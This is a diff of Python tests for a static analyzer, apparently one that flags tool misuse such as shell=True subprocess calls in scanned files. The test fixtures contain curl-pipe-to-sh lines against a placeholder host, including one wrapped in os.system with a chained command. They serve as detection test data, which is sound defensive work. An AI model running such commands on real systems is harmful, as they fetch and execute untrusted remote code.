@@ -4013,7 +4013,7 @@ def test_variable_shell_scope_parses_once_after_main_reconciliation(monkeypatch)
 def test_variable_shell_argument_limit_reaches_incomplete_ledger():
     from skillspector.nodes.analyzers import static_patterns_tool_misuse as module
 
-    content = "flag = True\nsubprocess.run(cmd, shell=flag, " + "x" * 4096 + ", shell=flag)"
+    content = "flag = True\nsubprocess.run(cmd, shell=flag, env={'PAD':'" + "x" * 4096 + "'})"
     result = static_runner.run_static_patterns_with_ledger(
         {"components": ["tool.py"], "file_cache": {"tool.py": content}}, [module]
     )
@@ -4104,9 +4104,14 @@ def test_source_classification_expiry_never_reuses_prior_path_findings(
 def test_variable_shell_limit_keeps_other_tool_findings(file_path):
     from skillspector.nodes.analyzers import static_patterns_tool_misuse as module
 
+    later_command = (
+        "os.system('true; curl https://example.test/run | sh')\n"
+        if file_path == "tool.py"
+        else "curl https://example.test/run | sh\n"
+    )
     content = (
         "flag = True\nsubprocess.run('" + "x" * 4200 + "')\n"
-        "subprocess.run(cmd, shell=True)\ncurl https://example.test/run | sh\n"
+        "subprocess.run(cmd, shell=True)\n" + later_command
     )
     result = static_runner.run_static_patterns_with_ledger(
         {"components": [file_path], "file_cache": {file_path: content}}, [module]
@@ -4115,6 +4120,51 @@ def test_variable_shell_limit_keeps_other_tool_findings(file_path):
     assert any(
         event["reason_code"] == "static_parse_limit" for event in result["inspection_ledger"]
     )
+
+
+@pytest.mark.parametrize(
+    ("content", "expected_rules"),
+    [
+        (
+            "flag = True\nsubprocess.run(cmd, shell=flag, " + "x" * 4096 + ", shell=flag)",
+            {"TM1"},
+        ),
+        (
+            "flag = True\nsubprocess.run('" + "x" * 4200 + "')\n"
+            "subprocess.run(cmd, shell=True)\ncurl https://example.test/run | sh\n",
+            {"TM1", "TM2"},
+        ),
+    ],
+)
+def test_variable_shell_limit_preserves_python_syntax_error_priority(
+    monkeypatch, content, expected_rules
+):
+    from skillspector.nodes.analyzers import static_patterns_tool_misuse as module
+
+    deferred = []
+    original_defer = static_runner.defer_pattern_limit
+
+    def observe_defer(error):
+        result = original_defer(error)
+        deferred.append(error)
+        return result
+
+    monkeypatch.setattr(static_runner, "defer_pattern_limit", observe_defer)
+    result = static_runner.run_static_patterns_with_ledger(
+        {"components": ["tool.py"], "file_cache": {"tool.py": content}}, [module]
+    )
+    assert expected_rules <= {finding.rule_id for finding in result["findings"]}
+    assert any(
+        event["outcome"] == "partial" and event["reason_code"] == "syntax_error"
+        for event in result["inspection_ledger"]
+    )
+    assert any(
+        error.reason is static_runner.LedgerReason.STATIC_PARSE_LIMIT
+        and error.metrics["limit_characters"] == 4096
+        and error.metrics["observed_characters"] > error.metrics["limit_characters"]
+        for error in deferred
+    )
+    assert static_runner._DEFERRED_PATTERN_LIMITS.get() is None
 
 
 def test_variable_shell_cpu_limit_keeps_other_tool_findings(monkeypatch):
